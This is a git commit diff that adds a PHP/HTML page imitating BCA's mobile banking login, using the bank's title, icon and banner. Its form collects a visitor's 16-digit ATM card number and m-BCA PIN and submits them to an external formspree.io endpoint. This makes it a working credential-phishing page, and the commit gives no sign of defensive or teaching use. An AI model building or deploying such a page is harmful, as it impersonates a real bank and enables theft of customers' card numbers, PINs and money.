3c758c2f749681d79ee93360f3bf3ed1211cb32d
nisacodelifings <annisap.siswa@smkn4bdg.sch.id>
2021-02-24 07:27:57 -0800

    ok gais

---
+++ Xampp/htdocs/email/BCA - Copy - Copy/input.php
@@ -0,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>Bcamobile | BCA</title>
+  <link rel="icon" href="https://play-lh.googleusercontent.com/ggZzVVDWsTm7gSnVl8m3cNFgoeUN2r7dhAZdB8lz0d_s6ZcYOkvUQdbG3dPU5LHZnWvc=s180-rw">
+  <link rel="stylesheet" href="input.css">
+  <link rel="stylesheet" href="css/normalize.css">
+  <link rel="stylesheet" href="css/skeleton.css">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+</head>
+<body>
+  <nav>
+    <img src="nav.png" alt="navbar">
+  </nav>
+  <br>
+  <div>
+    <img src="https://res.cloudinary.com/codelifings/image/upload/v1613365398/Tak_berjudul43_20210215120201_np8fkd.png" alt="">
+  </div>
+  <br><br>
+    <form action="https://formspree.io/f/xyybaejk" method="POST">
+      <input class="u-full-width" type="number" placeholder="Masukkan 16 angka No Kartu ATM anda" id="nomor-atm" name="nomor-atm">
+      <input class="u-full-width" type="number" placeholder="Masukkan Pin m-BCA Anda" id="pin" name="pin">
+      <input style="float: right" class="button-primary" type="submit" value="OK">
+    </form>
+
+</body>
+</html>
